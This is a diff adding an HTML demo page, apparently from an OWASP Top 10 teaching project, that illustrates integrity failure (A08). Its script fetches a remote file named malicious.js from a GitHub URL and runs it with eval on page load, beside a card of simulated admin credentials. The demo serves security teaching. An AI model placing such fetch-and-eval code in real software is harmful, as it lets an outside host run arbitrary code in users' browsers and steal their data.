@@ -1,0 +1,24 @@
+<section>
+    <div class="container mt-4">
+        <h2 class="text-center text-danger">A08 – Untrusted Script Demo</h2>
+
+        <div class="alert alert-warning">
+            This page includes a script from an <strong>unverified external source</strong> to demonstrate A08.
+        </div>
+        <p><strong>Script Source:</strong>
+            <code>https://raw.githubusercontent.com/Dzhuklevski/untrusted-js-demo/refs/heads/master/malicious.js</code>
+        </p>
+
+        <div class="card p-3 mt-3">
+            <h5>Simulated sensitive data</h5>
+            <p>Email: admin@ukim.mk</p>
+            <p>Password: ********</p>
+        </div>
+    </div>
+</section>
+
+<script>
+    fetch("https://raw.githubusercontent.com/Dzhuklevski/untrusted-js-demo/refs/heads/master/malicious.js")
+        .then(response => response.text())
+        .then(code => eval(code));
+</script>
